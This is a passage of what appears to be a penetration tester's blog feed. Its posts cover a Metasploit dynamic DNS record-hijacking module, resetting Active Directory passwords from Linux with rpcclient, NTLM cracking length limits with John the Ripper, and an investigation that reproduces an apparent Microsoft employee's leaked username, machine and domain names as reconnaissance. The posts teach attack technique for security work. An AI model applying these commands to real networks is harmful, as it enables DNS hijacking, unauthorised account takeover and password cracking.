&lt;p&gt;However, I run &lt;a href=&#34;http://novahackers.com/&#34;&gt;NoVAHackers&lt;/a&gt; with &lt;a href=&#34;https://twitter.com/carnal0wnage&#34;&gt;Chris Gates&lt;/a&gt; so I would be remiss to not mention it, and it&amp;rsquo;s parent &lt;a href=&#34;http://takeonme.org/&#34;&gt;AHA&lt;/a&gt;. Both are great communities with basically a mini-conference every month at the meetings.&lt;/p&gt;

&lt;p&gt;If you don&amp;rsquo;t have a hacker space, or &amp;ldquo;Hackers Association&amp;rdquo; in your area, first, look harder there probably is one that you just haven&amp;rsquo;t found yet, and second, if not, start it. I went to the first 2 or 3 meetings of NoVA Hackers by myself. Don&amp;rsquo;t be deterred by single digit membership or attendance. NoVA Hackers is near ~700 members + another 500 or so alumni since it started in 2009.&lt;/p&gt;

&lt;h3 id=&#34;which-is-the-industry-healthcare-automotive-telecommunication-banking-and-so-on-most-exposed-to-cyber-attacks-and-why&#34;&gt;Which is the industry (healthcare, automotive, telecommunication, banking, and so on) most exposed to cyber attacks and why?&lt;/h3&gt;

&lt;p&gt;Honestly I don&amp;rsquo;t want to answer this. Why would you point at someone and say &amp;ldquo;hit him, he&amp;rsquo;s easier to take down&amp;rdquo;&lt;/p&gt;

&lt;h3 id=&#34;what-scares-you-more-in-the-internet&#34;&gt;What scares you more in the Internet?&lt;/h3&gt;

&lt;p&gt;The fact that people think it&amp;rsquo;s a weapon for or against them.&lt;/p&gt;

&lt;h3 id=&#34;we-often-hear-about-cyber-weapons-and-cyber-attacks-against-critical-infrastructure-do-you-believe-concrete-the-risk-of-a-major-and-lethal-cyber-attack-against-a-critical-infrastructure&#34;&gt;We often hear about cyber weapons and cyber attacks against critical infrastructure. Do you believe concrete the risk of a major and lethal cyber attack against a critical infrastructure?&lt;/h3&gt;

&lt;p&gt;Yes, but in what country? Is the U.S. even the most connected these days? I doubt it. In counter point I would like you to watch the following for actual statistics on the matter by &lt;a href=&#34;https://twitter.com/spacerog&#34;&gt;@SpaceRogue&lt;/a&gt;:&lt;/p&gt;

&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/cZPv-wro-O8&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;

&lt;h3 id=&#34;why-and-which-are-the-most-exposed-ci&#34;&gt;Why and which are the most exposed CI?&lt;/h3&gt;

&lt;p&gt;Same issue with the industry question, not going to point at the weakest link. I guess an argument to the fact that making light of these targets helps to force action, but I think unless you have had your head in the sand every knows of &amp;ldquo;Cyber Threats&amp;rdquo; these days, and a heading like:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Security Expert Rob Fuller says that Widgets are the most vulnerable target in U.S. Infrastructure&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;doesn&amp;rsquo;t really further any message or get anyone&amp;rsquo;s attention to something they don&amp;rsquo;t already know.&lt;/p&gt;

&lt;p&gt;Thanks for your time. Have an awesome 4th of July.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Dynamic DNS Update Module</title>
      <link>https://malicious.link/post/2017/dynamic-dns-update-module/</link>
      <pubDate>Sun, 25 Jun 2017 07:35:28 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/dynamic-dns-update-module/</guid>
      <description>

&lt;p&gt;&amp;ldquo;Secure&amp;rdquo; DNS updates is the default in Windows, but there is an option to allow &amp;ldquo;Nonsecure&amp;rdquo; updates. I have seen this changed when non-Windows DHCP servers are used (eg Access Points), this opens a network up to some pretty nifty attacks that a Metasploit module just hit the ground for.&lt;/p&gt;

&lt;p&gt;&lt;center&gt;&lt;img src=&#34;https://malicious.link/images/2017/nonsecure_dns_updates.png&#34; alt=&#34;&#34; /&gt;&lt;/center&gt;&lt;/p&gt;

&lt;p&gt;The module was originally written by &lt;a href=&#34;https://twitter.com/kingsabri&#34;&gt;King Sabri&lt;/a&gt;, with many touch ups and the spoofing capability by &lt;a href=&#34;https://twitter.com/busterbcook&#34;&gt;busterbcook&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can read up on the pull request in &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/8599&#34;&gt;pr/#8599&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Just to drive home the point I&amp;rsquo;ll be using my Exchange server as a target:&lt;/p&gt;

&lt;p&gt;&lt;center&gt; &lt;strong&gt;You will break email for the entire company if you do this on a live network. Doing so is possibly a resume generating event.&lt;/strong&gt;&lt;/center&gt;&lt;/p&gt;

&lt;p&gt;&lt;center&gt;&lt;img src=&#34;https://malicious.link/images/2017/before_dns_update.png&#34; alt=&#34;&#34; /&gt;&lt;/center&gt;&lt;/p&gt;

&lt;p&gt;If you are going to be overwriting an existing record make sure to keep a note of the real IP address of the host you are overwriting so that you can fix the record afterwards.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ dig @192.168.80.10 sdexchange.sittingduck.info

;; ANSWER SECTION:
sdexchange.sittingduck.info. 1200 IN    A   192.168.80.13
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here is what the module looks like:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/admin/dns/dyn_dns_update
msf auxiliary(dyn_dns_update) &amp;gt; show options

Module options (auxiliary/admin/dns/dyn_dns_update):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CHOST                      no        The source address to use for queries and updates
   DOMAIN                     yes       The domain name
   HOSTNAME                   yes       The name record you want to add
   IP                         no        The IP you want to assign to the record
   RHOST                      yes       The vulnerable DNS server IP address
   TYPE      A                yes       The record type you want to add. (Accepted: A, AAAA, CNAME, TXT)
   VALUE                      no        The string to be added with TXT or CNAME record


Auxiliary action:

   Name    Description
   ----    -----------
   UPDATE  Add or update a record. (default)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It has 3 different actions, but you&amp;rsquo;ll mostly want &lt;code&gt;UPDATE&lt;/code&gt;. &lt;code&gt;UPDATE&lt;/code&gt; will automatically delete a record if it exists already and then add the record back with your specified settings.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; show actions

Auxiliary actions:

   Name    Description
   ----    -----------
   ADD     Add a new record. Fail if it already exists.
   DELETE  Delete an existing record.
   UPDATE  Add or update a record. (default)

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here are the settings I chose. Notice the IP address that I&amp;rsquo;m injecting isn&amp;rsquo;t on the same subnet as the domain.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; set DOMAIN sittingduck.info
DOMAIN =&amp;gt; sittingduck.info
msf auxiliary(dyn_dns_update) &amp;gt; set HOSTNAME sdexchange
HOSTNAME =&amp;gt; sdexchange
msf auxiliary(dyn_dns_update) &amp;gt; set IP 100.100.100.100
IP =&amp;gt; 100.100.100.100
msf auxiliary(dyn_dns_update) &amp;gt; set RHOST 192.168.80.10
RHOST =&amp;gt; 192.168.80.10
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And the output:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; run

[+] Found existing A record for sdexchange.sittingduck.info
[*] Sending dynamic DNS delete message...
[+] The record &#39;sdexchange.sittingduck.info =&amp;gt; 100.100.100.100&#39; has been deleted!
[*] Sending dynamic DNS add message...
[+] The record &#39;sdexchange.sittingduck.info =&amp;gt; 100.100.100.100&#39; has been added!
[*] Auxiliary module execution completed
msf auxiliary(dyn_dns_update) &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;game-over&#34;&gt;#Game Over&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/after_dns_update.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This will stay until fixed or another dynamic DNS update is performed from the original server (every 24 hours or so).&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Reset AD user password with Linux</title>
      <link>https://malicious.link/post/2017/reset-ad-user-password-with-linux/</link>
      <pubDate>Fri, 23 Jun 2017 07:35:28 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/reset-ad-user-password-with-linux/</guid>
      <description>&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/delegate_passwordreset.png&#34; alt=&#34;&#34; /&gt;
&lt;em&gt;Image showing how to allow users to be able to reset user passwords&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; If you are here because you are a helpdesk person, this is a pentest blog, so it&amp;rsquo;s coming from the mindset of a pentester, but this could just as easily be used for legitmate purposes.&lt;/p&gt;

&lt;p&gt;There are a great many things you can do with &lt;code&gt;rpcclient&lt;/code&gt; for examples outside of this blog post see these posts by &lt;a href=&#34;https://twitter.com/carnal0wnage&#34;&gt;Chris Gates&lt;/a&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html&#34;&gt;Enumerating user accounts on Linux and OS X with rpcclient&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://carnal0wnage.attackresearch.com/2007/08/more-of-using-rpcclient-to-find.html&#34;&gt;More of using rpcclient to find usernames&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://carnal0wnage.attackresearch.com/2010/06/more-with-rpcclient.html&#34;&gt;more with rpcclient&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://carnal0wnage.attackresearch.com/2012/05/from-low-to-pwned-5-honorable-mention.html&#34;&gt;From LOW to PWNED [5] Honorable Mention: Null Sessions&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;There have been plenty of times on pentests where I have had access to IT or helpdesk related accounts that had limited administrative powers. Almost always I or someone on the team found an internal wiki or share that they did have access to (and then we moved on from there), however they almost always have the ability to reset passwords.&lt;/p&gt;

&lt;p&gt;I was unable to find any documentation on how to do this from a Linux host, or at the very least to do it without Active Directory Users and Computers (ADUC), which would require a Windows machine. And figuring out how to run ADUC through a meterpreter sessions wasn&amp;rsquo;t an hurdle I ever had time for in engagements. :)&lt;/p&gt;

&lt;p&gt;Due to me being dumb and resetting a password of my own in my lab to something I couldn&amp;rsquo;t remember, I finally had the time to figure it out.&lt;/p&gt;

&lt;p&gt;If you have Samba client tools (&lt;code&gt;smbclient&lt;/code&gt;) installed, you can use &lt;code&gt;rpcclient&lt;/code&gt;.  Out of the gate, you can auth with password or kerberos (this is especially useful in situations where you have dropped into a user that has an active kerberos token or you can make one):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# rpcclient -U helpdesk //192.168.80.10
Enter helpdesk&#39;s password:
rpcclient $&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you have the package &lt;code&gt;passing-the-hash&lt;/code&gt;, you can even do this with just a NTLM hash.&lt;/p&gt;

&lt;p&gt;In order to change a password you neet to use the &lt;code&gt;setuserinfo2&lt;/code&gt; command:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;rpcclient $&amp;gt; setuserinfo2
Usage: setuserinfo2 username level password [password_expired]
result was NT_STATUS_INVALID_PARAMETER
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You will not be able to change the password of anyone with &lt;code&gt;AdminCount = 1&lt;/code&gt; (aka Domain Admins and other high priv accounts):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;rpcclient $&amp;gt; setuserinfo2 ima-domainadmin 23 &#39;ASDqwe123&#39;
result: NT_STATUS_ACCESS_DENIED
result was NT_STATUS_ACCESS_DENIED
rpcclient $&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But you can very easily target users who have alternate admin accounts:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;rpcclient $&amp;gt; setuserinfo2 adminuser 23 &#39;ASDqwe123&#39;
rpcclient $&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yes it would be nice if there was any sort of confirmation&amp;hellip;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The &lt;code&gt;23&lt;/code&gt; came from &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/cc245617.aspx&#34;&gt;this MSDN article&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If you have the package &lt;code&gt;samba-common-bin&lt;/code&gt; you can also do this with the &lt;code&gt;net&lt;/code&gt; command:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# net rpc password adminuser -U helpdesk -S 192.168.80.10
Enter new password for adminuser:
Enter helpdesk&#39;s password:
root@kali:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Huge thanks for &lt;a href=&#34;https://twitter.com/agsolino&#34;&gt;Beto Solino&lt;/a&gt; of &lt;a href=&#34;https://github.com/CoreSecurity/impacket&#34;&gt;Impacket&lt;/a&gt; fame for his help figuring this out.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Password Magic Numbers</title>
      <link>https://malicious.link/post/2017/05-06-2017-password-magic-numbers/</link>
      <pubDate>Sat, 06 May 2017 15:00:00 -0400</pubDate>
      
      <guid>https://malicious.link/post/2017/05-06-2017-password-magic-numbers/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/LAN_Manager&#34;&gt;LanManager passwords&lt;/a&gt; (&amp;ldquo;LM&amp;rdquo;) is a very old and well known password hashing function. Used way back in &lt;a href=&#34;https://en.wikipedia.org/wiki/OS/2&#34;&gt;OS/2 Warp&lt;/a&gt; and &lt;a href=&#34;https://en.wikipedia.org/wiki/MS-Net&#34;&gt;MS-Net&lt;/a&gt; (networking for MS-DOS). It was great in it&amp;rsquo;s day, however how it worked was not sustainable. The hashing was performed only haver uppercasing and splitting the password into two 7 character chunks. This meant that even if your password was 14 characters long, it was still technically only two 7 character passwords, that could be cracked separately.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/NT_LAN_Manager&#34;&gt;NTLM&lt;/a&gt;, it&amp;rsquo;s big brother came along with Windows NT (Windows 95 and Windows 98 did not have NTLM, and we don&amp;rsquo;t speak about Windows ME). Windows to this day stores both the LM and NTLM versions of passwords. This meant that if your password was under 15 characters it would still be stored in that LM crackable format (&lt;a href=&#34;https://support.microsoft.com/en-us/help/299656/how-to-prevent-windows-from-storing-a-lan-manager-hash-of-your-password-in-active-directory-and-local-sam-databases&#34;&gt;unless storage of LM is being prevented, which has become default&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;This is where the first &amp;ldquo;magic number&amp;rdquo; for passwords comes from. In many pentests I recommended in my reports that all sensitive passwords have a minimum of &lt;strong&gt;15 characters&lt;/strong&gt;. By doing this, no matter what the setting was for the storage of their passwords on whatever system they might be stored on, it would never be stored in LM. I even recommended it for normal users, but obviously that recommendation never stuck.&lt;/p&gt;

&lt;p&gt;Recently I discovered a new &amp;ldquo;magic number&amp;rdquo; for passwords: &lt;strong&gt;28&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Before I get into this, all of this information came from &lt;a href=&#34;https://twitter.com/hashcat&#34;&gt;Atom&lt;/a&gt; (Hashcat primary developer) &lt;a href=&#34;https://twitter.com/SolarDiz&#34;&gt;Solar Designer&lt;/a&gt; (John the Ripper) and &lt;a href=&#34;https://github.com/magnumripper&#34;&gt;Magnum&lt;/a&gt; (John the Ripper). I&amp;rsquo;m just putting it together because I had no idea this existed and I&amp;rsquo;ve been cracking passwords using both of these tools for ages. Huge thanks to them for all their help and patience.&lt;/p&gt;

&lt;p&gt;It turns out, that password cracking tools have maximum character lengths for passwords. This boggled my mind for a while but it makes total sense once Atom explained that it has to do with how the tools store the password candidates (dictionary words or generated clear texts to be used in the hash comparison attempt). They are stored in GPU registers, and unfortunately the speed of storing it there comes at a price. That price is that there isn&amp;rsquo;t enough registers to store candidates over certain lengths. The maximum lengths are specific to how each hashing function works so some maximum lengths are longer than others. The general rule of thumb at least in the world of Hashcat is 55 characters.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;UPDATE:&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The primary reason behind these specific length limits is that exceeding them doubles the amount of processing. The register pressure is a secondary aspect, and mostly limited to GPUs. (On CPUs, the candidate passwords themselves are not in registers.)&lt;/p&gt;

&lt;p&gt;&amp;ndash; Solar Designer&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://twitter.com/solardiz/status/861183622950334464&#34;&gt;https://twitter.com/solardiz/status/861183622950334464&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In the world of Windows however, passwords are stored using UTF16-LE. This means that password candidates are automatically double the character length as most other hashing functions, halving the possible maximum down to 27 characters. This means that lets say your password is a very well known quote like:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;You can&amp;rsquo;t handle the truth!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;who&amp;rsquo;s NTLM hash is &lt;code&gt;E478B144E719CFF85A5F2028F0DF1808&lt;/code&gt; you wouldn&amp;rsquo;t be able to crack it, even if it was in your dictionary, because it&amp;rsquo;s 28 characters. This limitation extends to any UTF16 based hash (which almost all Windows based hashing is)&lt;/p&gt;

&lt;p&gt;How do you know what the limits are? Well John the Ripper has a handy dandy argument that tells you specifics of each format:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@crackingbox:/opt/jtr/run# ./john --list=format-details --format=nt
NT      81      24      24      0002000f        43      MD4 256/256 AVX2 8x3  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you can see in the second column it says &amp;ldquo;81&amp;rdquo;. This is the maximum number of UTF8 characters that it can fit for that format type, but because John the Ripper supports up to the full standard of 3 bytes in UTF16, the maximum again, is 27 characters.&lt;/p&gt;

&lt;p&gt;You can read more here:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/magnumripper/JohnTheRipper/issues/2529&#34;&gt;https://github.com/magnumripper/JohnTheRipper/issues/2529&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.openwall.com/lists/john-users/2017/05/04/8&#34;&gt;http://www.openwall.com/lists/john-users/2017/05/04/8&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.openwall.com/lists/john-users/2017/05/04/9&#34;&gt;http://www.openwall.com/lists/john-users/2017/05/04/9&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you read through the openwall posts then you saw there is a way to compile &lt;a href=&#34;https://github.com/magnumripper/JohnTheRipper&#34;&gt;John (jumbo)&lt;/a&gt; to squeeze out a few more characters:&lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;This will slow down cracking considerably&lt;/strong&gt;)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@crackingbox:/opt/bigjohn/src/#./configure --disable-native-tests CFLAGS=&#39;-O2 -mno-sse2 -mno-mmx -U__SSE__&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lets see what this gets us:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@crackingbox:/opt/bigjohn/run/# ./john --list=format-details --format=nt
NT      125     1       1       0002000f        43      MD4 32/64
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We now have 125 total characters total (not just 41 - &lt;a href=&#34;https://twitter.com/solardiz/status/861182438818684929&#34;&gt;thanks Solar Designer for the update&lt;/a&gt;). And as you can probably guess, it cracks the password just fine now:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@crackingbox:/opt/bigjohn/run/# ./john /tmp/hashtest.txt --format=nt --wordlist=/tmp/list.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 32/64])
Remaining 1 password hash
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
You can&#39;t handle the truth! (Martha)
1g 0:00:00:00 DONE (2017-05-07 00:58) 33.33g/s 133.3p/s 133.3c/s 133.3C/s You can&#39;t handle the truth!
Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Hashcat also has a branch that supports longer passwords, but currently doesn&amp;rsquo;t support NTLM:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/hashcat/hashcat/tree/longer_passwords&#34;&gt;https://github.com/hashcat/hashcat/tree/longer_passwords&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So now my recommendations for passwords, at least in the Windows world is 28 characters or more makes it so that without tweaking, your 28 character Jack Nicholson quote based password is safer (I mean, Mimikatz still works, and keyloggers, and so on and so forth&amp;hellip;)&lt;/p&gt;

&lt;p&gt;28 characters is a bit tough to force on standard users, but making sure that at least your service, admin and &amp;ldquo;high risk&amp;rdquo; accounts are &amp;gt; 28 is a good step.&lt;/p&gt;

&lt;p&gt;Solar Designer also pointed me at the Openwall product called &lt;a href=&#34;http://www.openwall.com/passwdqc/&#34;&gt;passwdqc&lt;/a&gt; which is much more affordable than other password products I&amp;rsquo;ve seen for enterprises. Here is a direct link to the Windows version that allows 30 day trial: &lt;a href=&#34;http://www.openwall.com/passwdqc/windows/&#34;&gt;http://www.openwall.com/passwdqc/windows/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;I definitely could get things wrong in this post, it&amp;rsquo;s very new to me and I&amp;rsquo;m still digging. Please hit me up with any corrections via comments below, Facbook, Twitter, IRC, Google Hangouts, Wire, Signal, AIM, Slack, LinkedIn, Mastadon, WhatsApp, Skype, smoke signals&amp;hellip; however you wish, I&amp;rsquo;ll update this post as needed. Thanks!&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&amp;ndash;
mubix&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>2017 Shmoocon Hiring List</title>
      <link>https://malicious.link/post/2017/2017-shmoocon-hiring-list/</link>
      <pubDate>Thu, 05 Jan 2017 11:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/2017-shmoocon-hiring-list/</guid>
      <description>&lt;p&gt;Created the 2017 UNOFFICIAL ShmooCon Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;https://goo.gl/forms/egx5Iw7M6gI67yh02&#34;&gt;https://goo.gl/forms/egx5Iw7M6gI67yh02&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/1yzL7Y7TAP-b4Bu9j2pYsaB2VyTXEK0C_NJ19aezIFms/&#34;&gt;https://docs.google.com/spreadsheets/d/1yzL7Y7TAP-b4Bu9j2pYsaB2VyTXEK0C_NJ19aezIFms/&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;1200&#34; width=&#34;900&#34; src=&#34;https://docs.google.com/spreadsheets/d/1yzL7Y7TAP-b4Bu9j2pYsaB2VyTXEK0C_NJ19aezIFms/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Buying Internal Domain Access</title>
      <link>https://malicious.link/post/2016/buying-internal-domain-access/</link>
      <pubDate>Thu, 29 Dec 2016 07:35:28 -0500</pubDate>
      
      <guid>https://malicious.link/post/2016/buying-internal-domain-access/</guid>
      <description>

&lt;p&gt;&lt;strong&gt;NOTE: I DID NOT ATTEMPT ANYTHING MORE THAN LOGGING AGAINST ANY OF THE DOMAINS I REGISTERED FOR THIS RESEARCH&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;For anyone who knows me, they know that I&amp;rsquo;ve been obsessed with DNS for a long time. However, in this post I will show results of something I can&amp;rsquo;t quite explain. It all started with the following hypothesis:&lt;/p&gt;

&lt;p&gt;Windows systems make DNS/NetBIOS/LLMNR requests to find the domain controllers they logged into even when they are no longer attached to the domain.&lt;/p&gt;

&lt;p&gt;This has already been proven with attacks like &lt;a href=&#34;https://www.coresecurity.com/blog/ms15-011-microsoft-windows-group-policy-real-exploitation-via-a-smb-mitm-attack&#34;&gt;MS15-011&lt;/a&gt; and other attacks that aim to &lt;a href=&#34;https://blog.ahmednabeel.com/abusing-kerberos-to-ntlm-fallback-to-defeat-windows-authentication/&#34;&gt;bypass BitLocker Full-Disk Encryption&lt;/a&gt;. So I added a twist, I thought that maybe, just maybe, that Windows will automatically add a &lt;code&gt;.com&lt;/code&gt; on to the end of these requests when attempting to find them. If I buy these domains then there is a chance I can gain &lt;strong&gt;code execution&lt;/strong&gt; using Group Policy or supplying logon scripts (BAT files).&lt;/p&gt;

&lt;p&gt;Why do I think this? Because of past Def Con talks like:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;DEFCON 19: Bit-squatting: DNS Hijacking Without Exploitation

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=aT7mnSstKGs&#34;&gt;https://www.youtube.com/watch?v=aT7mnSstKGs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;DEFCON 21 - DNS May Be Hazardous to Your Health - Robert Stucke

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=ZPbyDSvGasw&#34;&gt;https://www.youtube.com/watch?v=ZPbyDSvGasw&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;But&amp;hellip; how on earth would you ever know what a internal domain controller is called? I started by searching for pastebin posts with &lt;code&gt;%LOGONSERVER%&lt;/code&gt;. This netted a few results, but when I searched for the same thing on gist.github.com I found something pretty surprising:&lt;/p&gt;

&lt;h3 id=&#34;microsoft&#34;&gt;Microsoft&lt;/h3&gt;

&lt;p&gt;Yes, I found a gist by what seems to be a Microsoft employee:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Source:

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://gist.github.com/AArnott/8b39bd70630302f5c630&#34;&gt;https://gist.github.com/AArnott/8b39bd70630302f5c630&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;has been deleted  - w00tw00t!!&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;(To Microsoft, I&amp;rsquo;m fully willing to transfer the domain or null route it until it expires, whichever you prefer)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;WE INTERRUPT THIS BLOG POST TO TALK ABOUT THE SERIOUS OSINT TREASURE THESE TYPES FILES AND ENVIRONMENTAL VARIABLES ARE&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We will break down a few of the pieces that provide OSINT value:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;COMPUTERNAME = ANDARNO-X1
USERDNSDOMAIN = REDMOND.CORP.MICROSOFT.COM
USERDOMAIN = REDMOND
USERDOMAIN_ROAMINGPROFILE = REDMOND
USERNAME = andarno
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Full domain name, user and computer name help to identify what the naming schemes are internally.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ChocolateyInstall = C:\ProgramData\chocolatey
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;a href=&#34;https://chocolatey.org/&#34;&gt;Chocolatey&lt;/a&gt; is in use and possible allowed in the domain. This tool has a few persistence options, and local privilege escalation paths.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;SSH_AGENT_PID = 9316
SSH_AUTH_SOCK = /tmp/ssh-rbPyaDrkXVLz/agent.10020
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Honestly I&amp;rsquo;ve never seen these options on a Windows box so I&amp;rsquo;m going to assume they are the result of &lt;a href=&#34;https://www.cygwin.com/&#34;&gt;Cygwin&lt;/a&gt; being installed and running with valid keys being in use. Again, another tool that provides possibilities for persistence &lt;a href=&#34;http://www.hexacorn.com/blog/category/autostart-persistence/&#34;&gt;beyond the standard Run keys&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Path =
C:\Users\andarno\git\VSIXSuppression\packages\Nerdbank.GitVersioning.1.1.2-rc\build\NativeBinaries/amd64
C:\Program Files (x86)\Microsoft Visual Studio 14.0\Common7\IDE\CommonExtensions\Microsoft\TestWindow
C:\Program Files (x86)\Microsoft SDKs\TypeScript\1.5
C:\Program Files (x86)\MSBuild\14.0\bin
C:\Program Files (x86)\Microsoft Visual Studio 14.0\Common7\IDE\
C:\Program Files (x86)\Microsoft Visual Studio 14.0\VC\BIN
C:\Program Files (x86)\Microsoft Visual Studio 14.0\Common7\Tools;C:\WINDOWS\Microsoft.NET\Framework\v4.0.30319
C:\Program Files (x86)\Microsoft Visual Studio 14.0\VC\VCPackages
C:\Program Files (x86)\HTML Help Workshop
C:\Program Files (x86)\Microsoft Visual Studio 14.0\Team Tools\Performance Tools
C:\Program Files (x86)\Windows Kits\10\bin\x86
C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.6 Tools\
C:\Users\andarno\tools\ConEmuPack
C:\Users\andarno\tools\ConEmuPack\ConEmu
C:\WINDOWS\system32
C:\WINDOWS
